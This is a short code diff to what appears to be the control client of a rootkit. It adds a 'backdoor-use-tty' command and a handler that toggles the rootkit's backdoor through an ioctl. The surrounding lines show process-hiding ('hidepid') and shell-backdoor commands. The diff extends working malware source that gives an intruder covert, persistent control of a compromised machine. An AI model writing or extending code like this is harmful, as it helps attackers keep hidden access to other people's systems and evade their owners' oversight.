@@ -58,7 +58,12 @@ parse_input(int argc, char **argv)
 
     if (ARGVCMP(1, "backdoor-use-tty")) {
         ASSERT_ARGC(2, "backdoor-use-tty <0 | 1>");
-        // TODO: return backdoor-use-tty handle
+
+        if (ARGVCMP(2, "0"))
+            return (cmd_t){ handle_togglebd, (void *)0 };
+
+        if (ARGVCMP(2, "1"))
+            return (cmd_t){ handle_togglebd, (void *)1 };
     }
 
     if (ARGVCMP(1, "hidepid")) {
@@ -110,6 +115,7 @@ handle_shellbd(void *arg)
 int
 handle_togglebd(void *arg)
 {
+    return issue_ioctl(G7_TOGGLEBD, (const char *)arg);
 }
 
 int
